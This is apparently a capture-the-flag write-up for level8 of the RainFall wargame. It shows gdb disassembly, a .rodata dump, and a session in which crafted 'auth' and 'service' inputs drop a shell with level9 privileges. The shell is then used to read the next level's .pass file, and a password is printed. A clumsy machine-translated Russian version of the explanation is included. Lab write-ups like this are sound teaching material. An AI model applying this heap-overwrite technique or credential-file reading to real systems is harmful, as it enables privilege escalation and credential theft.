disass
Dump of assembler code for function main:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	push   %edi
   0x08048568 <+4>:	push   %esi
=> 0x08048569 <+5>:	and    $0xfffffff0,%esp
   0x0804856c <+8>:	sub    $0xa0,%esp
   0x08048572 <+14>:	jmp    0x8048575 <main+17>
   0x08048574 <+16>:	nop
   0x08048575 <+17>:	mov    0x8049ab0,%ecx
   0x0804857b <+23>:	mov    0x8049aac,%edx
   0x08048581 <+29>:	mov    $0x8048810,%eax
   0x08048586 <+34>:	mov    %ecx,0x8(%esp)
   0x0804858a <+38>:	mov    %edx,0x4(%esp)
   0x0804858e <+42>:	mov    %eax,(%esp)
   0x08048591 <+45>:	call   0x8048410 <printf@plt>
   0x08048596 <+50>:	mov    0x8049a80,%eax
   0x0804859b <+55>:	mov    %eax,0x8(%esp)
   0x0804859f <+59>:	movl   $0x80,0x4(%esp)
   0x080485a7 <+67>:	lea    0x20(%esp),%eax
   0x080485ab <+71>:	mov    %eax,(%esp)
   0x080485ae <+74>:	call   0x8048440 <fgets@plt>
   0x080485b3 <+79>:	test   %eax,%eax
   0x080485b5 <+81>:	je     0x804872c <main+456>
   0x080485bb <+87>:	lea    0x20(%esp),%eax
   0x080485bf <+91>:	mov    %eax,%edx
   0x080485c1 <+93>:	mov    $0x8048819,%eax
   0x080485c6 <+98>:	mov    $0x5,%ecx
   0x080485cb <+103>:	mov    %edx,%esi
   0x080485cd <+105>:	mov    %eax,%edi
   0x080485cf <+107>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x080485d1 <+109>:	seta   %dl
   0x080485d4 <+112>:	setb   %al
   0x080485d7 <+115>:	mov    %edx,%ecx
   0x080485d9 <+117>:	sub    %al,%cl
   0x080485db <+119>:	mov    %ecx,%eax
   0x080485dd <+121>:	movsbl %al,%eax
   0x080485e0 <+124>:	test   %eax,%eax
   0x080485e2 <+126>:	jne    0x8048642 <main+222>
   0x080485e4 <+128>:	movl   $0x4,(%esp)
   0x080485eb <+135>:	call   0x8048470 <malloc@plt>
   0x080485f0 <+140>:	mov    %eax,0x8049aac
   0x080485f5 <+145>:	mov    0x8049aac,%eax
   0x080485fa <+150>:	movl   $0x0,(%eax)
   0x08048600 <+156>:	lea    0x20(%esp),%eax
   0x08048604 <+160>:	add    $0x5,%eax
   0x08048607 <+163>:	movl   $0xffffffff,0x1c(%esp)
   0x0804860f <+171>:	mov    %eax,%edx
   0x08048611 <+173>:	mov    $0x0,%eax
   0x08048616 <+178>:	mov    0x1c(%esp),%ecx
   0x0804861a <+182>:	mov    %edx,%edi
   0x0804861c <+184>:	repnz scas %es:(%edi),%al
   0x0804861e <+186>:	mov    %ecx,%eax
   0x08048620 <+188>:	not    %eax
   0x08048622 <+190>:	sub    $0x1,%eax
   0x08048625 <+193>:	cmp    $0x1e,%eax
   0x08048628 <+196>:	ja     0x8048642 <main+222>
   0x0804862a <+198>:	lea    0x20(%esp),%eax
   0x0804862e <+202>:	lea    0x5(%eax),%edx
   0x08048631 <+205>:	mov    0x8049aac,%eax
   0x08048636 <+210>:	mov    %edx,0x4(%esp)
   0x0804863a <+214>:	mov    %eax,(%esp)
   0x0804863d <+217>:	call   0x8048460 <strcpy@plt>


level8@RainFall:~$ objdump -d -j.rodata ./level8
0804880c <_IO_stdin_used>:
 804880c:	01 00 02 00 25 70 2c 20 25 70 20 0a 00 61 75 74     ....%p, %p ..aut
 804881c:	68 20 00 72 65 73 65 74 00 73 65 72 76 69 63 65     h .reset.service
 804882c:	00 6c 6f 67 69 6e 00 2f 62 69 6e 2f 73 68 00 50     .login./bin/sh.P
 804883c:	61 73 73 77 6f 72 64 3a 0a 00                       assword:..






level8@RainFall:~$ ./level8
(nil), (nil)
auth AAAA
0x804a008, (nil)
service AAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018
login
$ id
uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
$ cat ../level8/.pass
cat: ../level8/.pass: Permission denied
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a






После разборки двоичного файла мы поняли, что должны отправить это:

level8 @ RainFall: ~ $ ./level8 
(ноль), (ноль) 
auth abcdefghijklmnopqrstuvwxyz
0x804a008, (ноль) 
сервисаааааааааааааааааааааааааааааа
0x804a008, 0x804a018 
авторизоваться
$

двоичный файл создает систему ('/ bin / bash'), когда соблюдается первое условие
и когда мы отправляем "сервис" 
двоичный файл проверяет, что во время "входа в систему"
32-й символ не 0.


After dissassemble the binary, we understood that we have to send this :

level8@RainFall:~$ ./level8 
(nil), (nil) 
auth abcdefghijklmnopqrstuvwxyz
0x804a008, (nil) 
serviceaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
0x804a008, 0x804a018 
login
$

the binary make a system('/bin/bash') when the first condition is respected
and when we send "service" 
the binary verifies that during the "login"
the 32nd character is not 0.

